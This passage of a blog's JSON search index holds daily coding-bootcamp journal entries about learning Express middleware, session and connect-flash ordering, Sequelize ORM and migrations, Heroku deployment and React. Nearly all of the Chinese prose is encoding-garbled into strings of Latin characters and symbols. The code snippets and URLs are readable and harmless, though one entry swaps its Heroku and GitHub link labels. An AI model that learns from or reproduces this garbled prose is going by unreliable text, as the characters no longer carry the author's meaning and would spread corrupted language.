å°±ä»¥ç‚ºæ±è¥¿æ”¹å¥½äº†çš„é€™ç¨®ç³—äº‹ XDï¼Œä¸éå¹¸å¥½æœ‰å³æ™‚è¤‡ç¿’ï¼Œä¹Ÿå› ç‚ºçŠ¯éŒ¯è€Œè®“è¨˜æ†¶æ›´åŠ æ·±åˆ»äº›ã€‚å¸Œæœ›ä¹‹å¾Œèƒ½æ›´ç†Ÿèƒ½ç”Ÿå·§ã€‚ å¦å¤–è‡ªå·±åœ¨åšä¸€äº›ç·´ç¿’çš„æ™‚å€™æ­£å¥½å°±ç¢°åˆ°äº† Bugï¼Œ æ–¼æ˜¯å°±ç”¨äº† console.log å¤§æ³•ã€‚ä¸å¾—ä¸èªªé€™çœŸçš„æ˜¯ä¸€å€‹è »æœ‰æ•ˆçš„æ–¹å¼ï¼Œç•¶æˆ‘æŠŠç›¸é—œçš„è³‡è¨Šéƒ½çµ¦ log å‡ºä¾†å¾Œï¼Œé¦¬ä¸Šå°±å¯ä»¥æ‰¾å‡ºå•é¡Œåœ¨å“ªè£¡ï¼Œçªç„¶ç‚ºä»¥å‰ä¸æ‡‚å¾—æ€éº¼ä¸‹ console.log çš„æˆ‘æ„Ÿåˆ°å“€å‚· (â—__â—) é¡Œå¤–è©±ä»Šå¤©çš„æ™šé¤åƒäº†ä¸€é¡†æ ¸æ¡ƒè‘¡è„é¥…é ­ 15 å…ƒã€‚æœ¬ä¾†æƒ³èªªæœ‰æ ¸æ¡ƒå¾ˆåˆ’ç®—è€¶ï¼Œä½†åŸä¾†æ ¸æ¡ƒåªæœ‰ä¸€é¡†ï¼Œå¹«è‡ªå·± QQï¼Œä½†é‚„æ˜¯è »å¥½åƒçš„å•¦ã€‚ å¸Œæœ›æˆ‘ä»¥å¾Œä¹Ÿèƒ½åœ¨è‡ªå·±å®¶è£¡è²·ä¸€é¡†å¯æ„›çš„è–èª•æ¨¹ä¾†è£é£¾ï¼Œå¥³æœ‹å‹æ‡‰è©²æœƒå¾ˆé–‹å¿ƒã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ week2 çš„é€²åº¦éƒ½çµ¦å®Œæˆï¼å¿«é€Ÿé€²åˆ°ä¸‹ä¸€é€±é€²åº¦ï½","link":"/2021/12/21/mentor-program-day10/"},{"title":"mentor-program-day100","text":"å¾—ç¹¼çºŒåŠ ç·Šè…³æ­¥ã€‚ é€²åº¦ä»Šå¤©ç¹¼çºŒçœ‹ [BE201] æ¢ç´¢ Expressï¼Œç›®å‰é€²åº¦å¤§æ¦‚ 50% å·¦å³ï¼Œé›–ç„¶ Express + MVC æ•´é«”ä¸Šæ¯” PHP ç°¡æ½”å¾ˆå¤šï¼Œä½†é‚„æ˜¯éœ€è¦ä¸€é»æ™‚é–“ä¾†ç†Ÿæ‚‰èˆ‡ç·´ç¿’ã€‚ç¸½ä¹‹å†å¤šåŠ æ²¹å§ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©ä¸»è¦å°±æ˜¯ç·´ç¿’ Express çš„å¯¦ä½œå’Œå„ç¨® Middlewareã€‚é‚Šåšé‚Šä½œç­†è¨˜ï¼Œä½†ç­†è¨˜æœƒç­‰å®Œæ•´ä¸€é»å¾Œæ‰æœƒä¸Šå‚³ä¸Šä¾†ã€‚ å¦å¤–åœ¨ä½¿ç”¨ connect-flash é€™å€‹ Middleware æ™‚è¸©äº†ä¸€å€‹å¾ˆæ…˜çš„é›·ï¼Œå°±æ˜¯ä½¿ç”¨é †åºï¼š å…ˆä½¿ç”¨ session å†ä½¿ç”¨ connect-flash 12345678910const flash = require('connect-flash');const session = require('express-session');// session å…ˆapp.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true,}))// æ¥è‘—æ‰å¯ä»¥ç”¨ flashapp.use(flash()); ç‚ºä»€éº¼èªªé€™å€‹é›·å¾ˆæ…˜ï¼Ÿ æ…˜åœ¨æ˜æ˜åŠŸèƒ½é‹ä½œä¸æ­£å¸¸ï¼Œå»å®Œå…¨ä¸æœƒæœ‰éŒ¯èª¤è¨Šæ¯ã€‚ é€™ç¨® bug æ‰æ˜¯æœ€å¯æ€•çš„ï¼Œå› ç‚ºä½ æ ¹æœ¬ä¸çŸ¥é“å•é¡Œå‡ºåœ¨å“ªè£¡ã€‚æ‰€ä»¥æˆ‘å‰å¾Œå¤§æ¦‚èŠ±äº†å¤§æ¦‚ä¸€å°æ™‚æ‰æŠŠé€™å€‹ bug é™¤æ‰ï¼Œé€™æ¨£ä½ é‚„ä¸è¦ºå¾—å¯æ€•å—ï¼Ÿ é¡Œå¤–è©±ä¸çŸ¥é“è‡ªå·±çš„æ™‚é–“å¤ ä¸å¤ ï¼Œå¾—ç›¡å¿«æ‰è¡Œã€‚ æœŸè¨±æ˜å¤©ç¹¼çºŒè¶•é€²åº¦ï¼Œå¸Œæœ›èƒ½æŠŠ [BE201] çœ‹å®Œã€‚","link":"/2022/03/24/mentor-program-day100/"},{"title":"mentor-program-day101","text":"å„ç¨®æ“”å¿ƒã€‚ é€²åº¦ä»Šå¤©ç¹¼çºŒçœ‹ [BE201] å­¸ç¿’ ORM çš„éƒ¨åˆ†ã€‚ é€™å¹¾å¤©ç™¼ç”Ÿäº†ä¸å°‘äº‹ï¼Œæ€ç·’é‚„è »å‡Œäº‚çš„ï¼Œæ‰€ä»¥é€²åº¦æœ‰é»æ…˜ï¼Œä¸éé‚„æ˜¯æœƒç›¡åŠ›åŠ æ²¹çš„ã€‚ å­¸åˆ°çš„äº‹æƒ…ORM æ˜¯å€‹å¾ˆä¸éŒ¯çš„ libraryï¼Œç•¶åˆåœ¨å¯« PHP çš„æ™‚å€™å°±æœ‰æƒ³éæ˜¯ä¸æ˜¯èƒ½æŠŠ SQL çš„éƒ¨åˆ†æŠ½å‡ºä¾†å¯«æˆ functionï¼Œåƒé€™æ¨£ï¼š 12const result = sql('INSERT', ['username', 'password']);console.log(result) // 0 or 1 é€™å°±è·Ÿ ORM çš„æœ¬è³ªæœ‰é»åƒå§ï¼Œåªæ˜¯å¯«æˆç‰©ä»¶å°å‘çš„å‹å¼æœƒæ›´å¥½ä¸€é»ã€‚ é¡Œå¤–è©±æœ€è¿‘æœ‰ä¸€äº›æ–°çš„æ‰“ç®—ï¼Œå¸Œæœ›å¯ä»¥ä¸€å¸†é¢¨é †ã€‚ æœŸè¨±æ˜å¤©ç¹¼çºŒçœ‹ [BE201]ï¼Œå¦‚æœå¯ä»¥çœ‹å®Œå°±å¥½äº†ã€‚","link":"/2022/03/25/mentor-program-day101/"},{"title":"mentor-program-day102","text":"ç¹¼çºŒè¡è¡è¡ã€‚ é€²åº¦ä»Šå¤©ç¸½ç®—æ˜¯æŠŠ ORM çš„éƒ¨åˆ†çœ‹å®Œäº†ï¼Œä¹ŸæŠŠæ•´ç†å¥½çš„ç­†è¨˜æ”¾ä¸Šä¾†äº†ï¼š Express å’Œ Apache çš„å·®åˆ¥ MVC æ¶æ§‹èˆ‡åŸºæœ¬ç¯„ä¾‹ èªè­˜ Express ä¸­çš„ Middleware ä½¿ç”¨ Express æ™‚çš„æ³¨æ„äº‹é …ï¼Œé‚„æœ‰ä¸€äº›åœ°é›· ä½¿ç”¨ ORM çš„äº‹å‰æº–å‚™ ORM çš„ CRUD ORM å»ºç«‹é—œè¯ Sequelize-CLI åŸºæœ¬ä½¿ç”¨ æ¥ä¸‹ä¾†å‰©ä¸‹éƒ¨ç½²çš„éƒ¨åˆ†è€Œå·²ï¼Œä¸€æ¨£å¸Œæœ›ä¸€åˆ‡é †åˆ©ã€‚ å­¸åˆ°çš„äº‹æƒ…åœ¨é‡çœ‹å¾ˆå¤šæ¬¡å½±ç‰‡ã€ç­†è¨˜å’Œå¯¦ä½œä»¥å¾Œï¼Œæ„Ÿè¦ºå° ORM æœ‰æ¯”è¼ƒç†Ÿæ‚‰ä¸€é»äº†ï¼Œæ¥ä¸‹ä¾†ä¹Ÿæ˜¯ä¸€æ¨£åšæ›´å¤šç·´ç¿’ä¾†è®“è‡ªå·±æ›´ç†Ÿæ‚‰å§ï¼ ä¸€é–‹å§‹åœ¨å­¸ Sequelize CLI çš„æ™‚å€™ï¼Œå° Migration çš„æ¦‚å¿µé‚„è »æ¨¡ç³Šçš„ã€‚ä¸éå¤šè©¦å¹¾æ¬¡ä»¥å¾Œæœ‰æ¯”è¼ƒæ¸…æ¥šä¸€äº›ï¼Œé›–ç„¶é€”ä¸­å°‘ä¸äº†å„ç¨®åœ°é›·â€¦ä½†é€™å°±æ˜¯å­¸ç¿’çš„éç¨‹å§ã€‚ é¡Œå¤–è©±è¦ç›¸ä¿¡è‡ªå·±èƒ½åšåˆ°ï¼ŒåŠ æ²¹ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ [BE201] çµæŸï¼","link":"/2022/03/26/mentor-program-day102/"},{"title":"mentor-program-day103","text":"èµ°å¾—æ…¢ä¹Ÿè¦ç¹¼çºŒèµ°ã€‚ é€²åº¦ä»Šå¤©åŸºæœ¬ä¸Šæ²’åšä»€éº¼ï¼Œåªæœ‰ç°¡å–®çœ‹äº†ä¸€ä¸‹ä½ˆç½²çš„éƒ¨åˆ†ã€‚å¾Œä¾†ä¹Ÿå› ç‚ºä¸€äº›äº‹æƒ…æ‰€ä»¥æ²’ç²¾ç¥åšäº‹æƒ…ï¼Œè·‘å»éš¨ä¾¿å¯«ä¸€äº› React åŸºç¤ç•¶ä½œæ‰“ç™¼æ™‚é–“ã€‚ å­¸åˆ°çš„äº‹æƒ…é€™å¹¾å¤©æ‡‰è©²é€²åº¦éƒ½ä¸æœƒå¤ªå¥½ï¼Œä½†é‚„æ˜¯æœƒç›¡åŠ›èµ°ä¸‹å»çš„ã€‚ é¡Œå¤–è©±å¸Œæœ›æ¯å€‹äººéƒ½å¯ä»¥å¹¸ç¦ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠæ±è¥¿ä½ˆç½²ä¸Šå»å§ï¼Œå¤§æ¦‚å°±é€™æ¨£ã€‚","link":"/2022/03/27/mentor-program-day103/"},{"title":"mentor-program-day104","text":"è©²ç¹¼çºŒå¾€å‰äº†ã€‚ é€²åº¦ä»Šå¤©ä»€éº¼éƒ½æ²’åšï¼Œåªæœ‰çœ‹äº†ä¸€é»é»å½±ç‰‡ + éš¨æ‰‹å¯« Reactã€‚ æ˜å¤©è¦å¥½å¥½æ‰“èµ·ç²¾ç¥ç¹¼çºŒåŠªåŠ›äº†ã€‚ å­¸åˆ°çš„äº‹æƒ…ç¡¬è¦èªªçš„è©±ï¼Œåªæœ‰å° useState å’Œ Component æœ‰ç¨å¾®èªè­˜äº†ä¸€äº›å§ã€‚ é¡Œå¤–è©± å·¥ç¨‹å¸«çš„æ—¥å¸¸å°±æ˜¯é™¤äº†ä¸€å€‹éŒ¯ä¹‹å¾Œçœ‹åˆ°çš„ä¸æ˜¯æ­£å¸¸ï¼Œè€Œæ˜¯çœ‹åˆ°ä¸‹ä¸€å€‹éŒ¯èª¤è¨Šæ¯ã€‚è¦æœ‰è€å¿ƒã€‚ å¶ç„¶çœ‹åˆ°é€™å¥è©±è¦ºå¾—é‚„è »è²¼åˆ‡çš„ï¼Œæ‰€ä»¥å°±è²¼ä¸Šä¾†å§ã€‚ æœŸè¨±ä»Šå¤©æ²’åšåˆ°è©²åšçš„äº‹ï¼Œæ‰€ä»¥æ˜å¤©è¦å¥½å¥½åšå®Œã€‚","link":"/2022/03/28/mentor-program-day104/"},{"title":"mentor-program-day105","text":"å¥½å¥½çæƒœæˆ‘å€‘æ‰€æ“æœ‰çš„ã€‚ é€²åº¦ä»Šå¤©åŠªåŠ›çš„è·‘é€²åº¦ï¼ŒæˆåŠŸæŠŠç¶²ç«™ä¸Ÿåˆ° Heroku ä¸Šéƒ¨ç½²äº†ï¼Œä¹Ÿåšäº†ä¸€é»ç­†è¨˜ï¼š ä»€éº¼æ˜¯æ­£å‘ä»£ç†èˆ‡åå‘ä»£ç† Heroku çš„éƒ¨ç½²æµç¨‹ Heroko è¨­å®šè³‡æ–™åº« cleardb ç¸½ç®—æ˜¯å‘Šä¸€æ®µè½äº†ï¼Œæ¥ä¸‹ä¾†å°±æ˜¯åšä½œæ¥­äº†ã€‚ å­¸åˆ°çš„äº‹æƒ…æ„Ÿè¦ºå°éƒ¨ç½²æœ‰è¶Šä¾†è¶Šç†Ÿæ‚‰äº†ï¼Œå…¶å¯¦åšä¾†åšå»ä¸»è¦éƒ½é€™å¹¾å€‹å‹•ä½œï¼š æŠŠæª”æ¡ˆæ”¾åˆ°æŸå€‹åœ°æ–¹ï¼ˆè™›æ“¬ä¸»æ©Ÿ / è™›æ“¬å¹³å° / å¯¦é«”ä¸»æ©Ÿï¼‰ å»ºç½®ç’°å¢ƒï¼ˆè³‡æ–™åº« or ä¼ºæœå™¨ï¼‰ ç´°éƒ¨å¾®èª¿ é›–ç„¶ç¬¬ä¸€æ¬¡åšçš„æ™‚å€™æœƒè¦ºå¾—å¾ˆçŸ‡ï¼Œä¸å¤ªæ¸…æ¥šè‡ªå·±åœ¨å¹¹å˜›ï¼Œä½†å¾ˆæ…¶å¹¸ç¶“éç·´ç¿’å¾Œé€æ¼¸æŒæ¡äº†ã€‚ è³‡æ–™åº«çš„æœ¬è³ªè »ç°¡å–®çš„ï¼Œä¸éè¨­å®šèµ·ä¾†é‚„çœŸçš„æœ‰é»éº»ç…©ï¼Œå¸Œæœ›ä¹‹å¾Œèƒ½è¶Šåšè¶Šé †ã€‚ æœ€å¾Œæ˜¯é‡æ§‹ï¼ˆrefactoringï¼‰é€™ä»¶äº‹ã€‚è¦æ€éº¼å¿«é€Ÿçš„é‡æ§‹é‚„çœŸæ˜¯é–€å­¸å•ï¼Œç¸½ä¹‹å¤šç·´ç¿’å§ã€‚ é¡Œå¤–è©±é‚„æ˜¯å¸Œæœ›æ¯å€‹äººéƒ½èƒ½å¹¸ç¦å°±å¥½ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥é †åˆ©æŠŠ blog é‡æ§‹å®Œæˆã€‚","link":"/2022/03/29/mentor-program-day105/"},{"title":"mentor-program-day106","text":"ç¹¼çºŒèˆ‡é›œäº‚çš„ code ç›¸è™•ã€‚ é€²åº¦ä»Šå¤©é–‹å§‹é‡æ§‹ä¹‹å‰ç”¨ PHP å¯«çš„éƒ¨è½æ ¼ï¼Œç›®å‰å¤§æ¦‚å®Œæˆäº† 80% å§ï¼š å…ˆä¸èªªé‡æ§‹æœ‰å¤šéº»ç…©ï¼Œä¸å¾—ä¸èªª JS + ORM + MVC ä¾†å¯«å¾Œç«¯çœŸçš„çˆ½å¿«å¾ˆå¤šã€‚ ä¸€ä¾†æ˜¯æˆ‘æœ¬ä¾†å°±è·Ÿ JS æ¯”è¼ƒç†Ÿï¼Œå†åŠ ä¸Šç”¨äº† ORM å°±ä¸ç”¨å†å¯« SQL Queryï¼Œé‚„æœ‰ MVC é€™ä¹¾æ·¨çš„æ¶æ§‹ï¼Œæ€ªä¸å¾—ç¾åœ¨å¾ˆå°‘äººå†ç”¨ç´” PHP ä¾†å¯«ç¶²ç«™äº†ï¼Œé€™é»æˆ‘é —æœ‰æ„Ÿè§¸ï½ ä¸éå‰›å‰›ä¹Ÿé€æ¼äº†ï¼Œå…¶å¯¦é‡æ§‹é‚„æ˜¯å¾ˆéº»ç…©çš„ï¼Œç•¢ç«Ÿé€™è·ŸåŸæœ¬å¯« PHP çš„å¯«æ³•å·®è »å¤šçš„ï¼ˆå°¤å…¶æ˜¯æ²’æœ‰ MVC æ¶æ§‹ï¼‰ï¼Œæ‰€ä»¥å¹¾ä¹æ‰€æœ‰åœ°æ–¹éƒ½å¾—é‡æ–°æ”¹æ‰è¡Œã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘èŠ±äº†ä¸€å¤©é‚„æ²’è¾¦æ³•å…¨éƒ¨é‡æ§‹å®Œç•¢ QQ é †é“ä¸€æï¼Œæˆ‘ç¾åœ¨é«”æœƒåˆ° Restful é€™æ±è¥¿è¬›æˆç™½è©±å°±æ˜¯ã€ŒURL æ½”ç™–ã€å§ï¼Œå“ˆå“ˆå“ˆã€‚é›–ç„¶æˆ‘ä¹Ÿæƒ³èªªé€™æ¬¡é‡æ§‹ä¾†è©¦çœ‹çœ‹ Restful çš„ pattern å¥½äº†ï¼Œä¸éå¾Œä¾†ç™¼ç¾é€™éœ€è¦ä¾è³´å‰ç«¯ç”¨ AJAX æ‰è¡Œã€‚æ‰€ä»¥ç›®å‰åªå¥½ä½œç½·ï¼Œç­‰ä»¥å¾Œæœ‰æ©Ÿæœƒå†è©¦è©¦çœ‹å§ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å¯«äº†ä¸€æ•´å¤©çš„ codeï¼Œä¸»è¦æ˜¯ç·´ç¿’ Express å’Œ ORM çš„éƒ¨åˆ†å§ï¼Œæœ‰äº›åœ°æ–¹æˆ‘é‚„å¡è »ä¹…è·Ÿä¸å¤ ç†Ÿæ‚‰ï¼Œå¸Œæœ›èƒ½åœ¨é€™é€±åšå®Œä½œæ¥­å¾Œè®Šå¾—ç†Ÿèƒ½ç”Ÿå·§ã€‚ é¡Œå¤–è©±ç¹¼çºŒåŠ æ²¹å§ï¼ æœŸè¨±å¸Œæœ›æ˜å¤©èƒ½é †åˆ©é‡æ§‹å®Œç•¢ï¼Œè·Ÿèƒ½é †ä¾¿åšä¸‹å€‹ä½œæ¥­çš„è©±å°±æ›´å¥½äº†ã€‚","link":"/2022/03/30/mentor-program-day106/"},{"title":"mentor-program-day107","text":"æŒçºŒå¾€å‰èµ°å§ã€‚ é€²åº¦é›–ç„¶ä»Šå¤©ä¸å°å¿ƒç¡äº†å¤ªé•·çš„åˆè¦ºï¼Œä½†é‚„æ˜¯æŠŠéƒ¨è½æ ¼çµ¦é‡æ§‹å®Œç•¢ + éƒ¨ç½²åˆ° Heroku å’Œ GitHub ä¸Šï¼š Herokuï¼šhttps://github.com/jubeatt/Express-blog GitHubï¼šhttps://peanu-blog.herokuapp.com/ æ˜å¤©è¦ä¾†å¥½å¥½åŠªåŠ›æŠŠå‰©ä¸‹çš„ä½œæ¥­åšå®Œï¼ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©ä¹Ÿæ˜¯è¤‡ç¿’ Express + ORM çš„ç”¨æ³•ï¼Œæ„Ÿè¦ºæœ‰åœ¨æ›´ç†Ÿæ‚‰ä¸€äº›ã€‚ é¡Œå¤–è©±é‚„åœ¨è€ƒæ…®æ¥ä¸‹ä¾†çš„é€²åº¦è©²ä¸è©²è·³éï¼Œå¾—å†å¤šæƒ³æƒ³çœ‹ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©åšä½œæ¥­é †åˆ©ã€‚","link":"/2022/03/31/mentor-program-day107/"},{"title":"mentor-program-day108","text":"è¶•å·¥è¶•å·¥ã€‚ é€²åº¦ä»Šå¤©é‡æ–°æŠŠ Sequelize çš„æˆ‘æ²’ææ‡‚çš„åœ°æ–¹å†è¤‡ç¿’ä¸€éï¼Œç¸½ç®—æ˜¯ç†è§£ Migration æ˜¯å¹¹å˜›ç”¨çš„äº†ï¼Œä»¥åŠå®ƒè·Ÿ Model çš„å·®åˆ¥åœ¨å“ªè£¡ã€‚é™„ä¸Šä¸€ä¸‹åšçš„ç­†è¨˜ï¼š é‡æ–°ç†è§£ Sequelize ä¸­çš„ Migration å’Œ Model Sequelize é€é Migration ä¾†ä¿®æ”¹ Table è³‡è¨Š æ¥ä¸‹ä¾†å°±å»åšç¬¬äºŒå€‹ä½œæ¥­äº†ï¼Œç›®å‰åªæŠŠä»¥å‰åšçš„æ±è¥¿æ•´åˆèµ·ä¾†ï¼Œå†æ·»åŠ ä¸€äº›åŠŸèƒ½ä¸Šéœ€è¦çš„ UI ä»‹é¢ï¼Œé‚„æœ‰ä¸€äº›åŸºæœ¬çš„å¾Œç«¯åŠŸèƒ½ï¼š æ²’æ„å¤–çš„è©±æœƒé †ä¾¿æŠŠä¸‹ä¸€é€±çš„åŠŸèƒ½é †ä¾¿åšä¸€åšï¼Œé€™æ¨£å°±æ˜¯ä¸€å€‹æ¯”è¼ƒå®Œæ•´çš„å°ˆæ¡ˆäº†ã€‚ï¼ˆä¸éä¼¼ä¹æœ‰è »å¤š UI å¾—åˆ»â€¦ å…ˆå¹«è‡ªå·± QQ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©ç¸½ç®—å¼„æ‡‚ Migration çš„ç”¨é€”ï¼Œä¸ç„¶ä»¥å‰åœ¨æ–°å¢æ¬„ä½æˆ–ä¿®æ”¹æ¬„ä½æ™‚çœŸçš„è »ï¼Ÿï¼Ÿï¼Ÿæƒ³èªªç¸½ä¸èƒ½æ°¸é éƒ½ç”¨ db:migrate:undo:all æŠŠè³‡æ–™å…¨éƒ¨ç æ‰é‡ç·´å§ï¼Œé€™æ¨£å¤ªè©­ç•°äº†ã€‚å¥½åœ¨ä»Šå¤©æœ‰æŠŠå®ƒå¼„æ‡‚ï¼Œç¾åœ¨å°æ–¼ ORM å¯ä»¥èªªæ˜¯è¶Šä¾†è¶Šç†Ÿæ‚‰äº†ï¼Œå¾ˆå¥½ï¼ é–‹å§‹åšç¬¬äºŒä»½ä½œæ¥­å¾Œï¼Œåˆå›åˆ°å¥½ä¹…ä¸è¦‹çš„åˆ»ç•«é¢æµç¨‹ã€‚ä¸å¾—ä¸èªªæœ‰æ™‚è…¦è¢‹æ²’ç•«é¢é‚„è¦è…¦è£œæŒºéº»ç…©çš„ï¼Œé€™ä¹Ÿæ˜¯è¨­è¨ˆå¸«çš„å­˜åœ¨æ„ç¾©å§ï¼Œæœ‰è¨­è¨ˆç¨¿çœŸçš„èƒ½ç¯€çœä¸€äº›æ™‚é–“ï¼ˆç•¶ç„¶ï¼Œä¹Ÿæœƒæœ‰èŠ±æ›´å¤šæ™‚é–“çš„æƒ…æ³å°±æ˜¯äº†ï¼‰ã€‚ é¡Œå¤–è©±æ¡†æ¶ç‚ºä½ å¸¶ä¾†äº†ä»€éº¼å¥½è™•ï¼Ÿç•¶ä½ å¯«è¶Šä¹…çš„ code å°±è¶Šèƒ½ç†è§£é€™ä»¶äº‹ã€‚ æœŸè¨±é‚„æ˜¯ä¸€æ¨£ï¼Œå¸Œæœ›æ˜å¤©åšä½œæ¥­é †åˆ©ï¼","link":"/2022/04/01/mentor-program-day108/"},{"title":"mentor-program-day109","text":"é²ä¾†çš„ä¸€å¤©ã€‚ é€²åº¦æœ¬ä¾†æ˜¯ç¬¬ 110 å¤©çš„ï¼Œä¸éå®¶è£¡çš„å¯¶è²åœ¨ä»Šå¤©é›¢é–‹äº†ã€‚å¿ƒæƒ…å¯¦åœ¨å¤ªè¤‡é›œï¼Œä¹Ÿå¾ˆé›£å—ï¼Œæ‰€ä»¥å°±å°‘äº†ä¸€å¤©çš„é€²åº¦ï¼Œä½†é‚£ä¹Ÿä¸é‡è¦äº†ã€‚ç¾åœ¨å”¯ä¸€çš„å¸Œæœ›æ˜¯ä»–èƒ½å¤ åˆ°å¦ä¸€å€‹å¹¸ç¦çš„ä¸–ç•Œç”Ÿæ´»ï¼Œé‚„æœ‰å’Œä»–çš„å¤¥ä¼´å€‘åœ¨ä¸€èµ·ï¼Œé€™æ¨£å°±å¥½äº†ã€‚ æ—¢ç„¶ä»Šå¤©æ²’æœ‰é€²åº¦ï¼Œé‚£å°±å ±å‘Šå‰ä¸€å¤©çš„å§ã€‚ å‰å¤©æˆ‘æŠŠä½œæ¥­çµ¦å®Œæˆäº†ï¼š å¯«ä¸€å€‹æŠ½ççš„ APIï¼Œåœ¨ä¸²åˆ°å‰ç«¯å» å¯«ä¸€å€‹ç®¡ç†æŠ½ççš„å¾Œå° è¨­è¨ˆå¾Œå°çš„ RWD ç‰ˆé¢è·Ÿåˆ‡ç‰ˆ å¤§æ¦‚ä¸»è¦æ˜¯é€™æ¨£å­å§ï¼Œæ¯”è¼ƒæ£˜æ‰‹çš„åœ°æ–¹æ˜¯å¾Œå°ä»‹é¢è¦åˆ‡æˆ RWD é‚„è »é›£ç™¼æ®çš„ï¼Œç•¢ç«Ÿå¾Œå°è¬›æ±‚åŠŸèƒ½æ€§ï¼Œè¦è¨­è¨ˆçš„è®“æ‰‹æ©Ÿä¸Šä¹Ÿèƒ½å¥½æ“ä½œé‚„çœŸä¸æ˜¯ä»¶å®¹æ˜“çš„äº‹æƒ…ã€‚ å­¸åˆ°çš„äº‹æƒ…ä¸»è¦å°±æ˜¯ç¹¼çºŒç·´ç¿’ Express å’Œ ORM çš„æ“ä½œï¼Œåšåˆ°é€™è£¡ä¹Ÿå°é€™äº›æ›´åŠ ç†Ÿæ‚‰äº†ã€‚ å¾Œä¾†ä¹ŸèŠ±äº†ä¸€é»æ™‚é–“å»ç ”ç©¶å’Œç’°å¢ƒè®Šæ•¸æœ‰é—œçš„æ±è¥¿ï¼Œæ‡‰è©²ä¹‹å¾Œå°±æœƒæ”¹æˆé€™æ¨£çš„å½¢å¼ä¾†å¯«è¨­å®šæª”å§ã€‚ä¸éé€™è£¡é‚„æ˜¯æƒ³åæ§½ä¸€ä¸‹ Sequelize çš„è¨­å®šæª”ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æœ‰ bugï¼Ÿæ˜æ˜å¯«äº† Sequelizercï¼Œå»å®Œå…¨æ²’è¾¦æ³•å¥—ç”¨ï¼Œä¸Šç¶²æ‰¾ä¹Ÿæ‰¾ä¸åˆ°è§£æ³•ã€‚ ç¸½ä¹‹æœ€å¾Œçš„è§£æ³•æ˜¯ç›´æ¥å»æ”¹ entry çš„å…§å®¹æ‰å‡ºç¾æ•ˆæœï¼Œé›–ç„¶ä¸çŸ¥é“é€™æ¨£çš„åšæ³•æ­£ä¸æ­£ç¢ºï¼Œä½†æˆ‘çœ‹å…¶ä»–åŒå­¸ä¹Ÿæ˜¯é€™æ¨£åšçš„ï¼Œæ‰€ä»¥æ‡‰è©²ä¹Ÿä¸å¤±ç‚ºä¸€ç¨®ä½œæ³•å§ï¼ˆæˆ–æ˜¯å¦‚æœæœ‰äººçŸ¥é“çš„è©±ï¼Œæ­¡è¿å‘Šè¨´æˆ‘ä¸€è²ï¼‰ã€‚ é¡Œå¤–è©±ä¾ç„¶ä¸æ¨ï¼Œä¸è«–æ˜¯å“ªä¸€å€‹å­©å­ã€‚ æœŸè¨±åŸæœ¬çš„è¨ˆç•«æ˜¯æŠŠé¤å»³ç¶²ç«™çµ¦åšå®Œæ•´ï¼Œä½†ä¹Ÿè¨±æˆ‘æ²’æœ‰é‚£éº¼å¤šæ™‚é–“ï¼Œå¯èƒ½çœŸçš„å¾—å…ˆå¾€ React èµ°å§ï¼ŒåŠ æ²¹ã€‚","link":"/2022/04/03/mentor-program-day109/"},{"title":"mentor-program-day11","text":"è½èªªä»Šå¤©æ˜¯å†¬è‡³ã€‚ é€²åº¦é–‹å§‹é€²å…¥åˆ° [ALG101] çš„èª²ç¨‹ï¼Œç›®å‰çš„é€²åº¦ 22 %ã€‚ èŠ±äº†æ¯”è¼ƒå¤šçš„æ™‚é–“åœ¨ç·´ç¿’èˆ‡å¯¦ä½œï¼Œç­†è¨˜ç›¸å°åšçš„ä¸å¤šï¼š è®Šæ•¸çš„å‘½åå“²å­¸ æ‰¾å‡ºæ¬¡å¤§å€¼ ä¸Šä¸€æ¬¡ä¿® [ALG101] æ™‚æ²’æœ‰æŠŠè‡ªå·±æ¯”è¼ƒä¸ç†Ÿçš„é¡Œç›®çµ¦å¤šç·´ç¿’èˆ‡ç­†è¨˜ï¼Œé€™ä¸€æ¬¡æƒ³æŠŠæˆ‘è¦ºå¾—ä¸éŒ¯æˆ–æ˜¯å€¼å¾—ç·´ç¿’çš„é¡Œç›®çµ¦ç´€éŒ„åˆ°éƒ¨è½æ ¼è£¡ï¼Œé€™æ¨£å°±èƒ½ç¶“å¸¸å›ä¾†ç·´ç¿’æˆ–åƒè€ƒäº†ã€‚ å¦å¤–é€™æ¬¡ä¹Ÿç‰¹åœ°é–‹äº†ä¸€å€‹ repoã€‚ä»¥å‰å°±æƒ³åšé¡ä¼¼é€™æ¨£çš„äº‹äº†ï¼Œä½†å› ç‚ºç•¶æ™‚ Git ç”¨çš„ä¸ç†Ÿï¼Œæ‰€ä»¥éƒ½æ²’é€™æ¨£å­åšï¼Œé€™æ¬¡æœ‰é€™æ¨£çš„æ©Ÿæœƒé‚„è »é–‹å¿ƒçš„ï¼ å­¸åˆ°çš„äº‹æƒ…å­¸è‘—è®“è‡ªå·±ç”¨ã€Œä¸€å€‹æŒ‡ä»¤åšä¸€ä»¶äº‹ã€çš„æ–¹å¼ä¾†æ€è€ƒæ€éº¼è§£é¡Œï¼Œé‚„æœ‰ã€ŒæŠŠäº‹æƒ…ç”±å¤§æ‹†åˆ°å°ã€çš„æ–¹å¼ä¾†æ€è€ƒï¼Œé€™å…©ç¨®æ–¹å¼æ˜¯æˆ‘è¦ºå¾—å°è§£é¡Œæœƒæ¯”è¼ƒæœ‰å¹«åŠ©çš„æ€è€ƒæ¨¡å¼ã€‚ 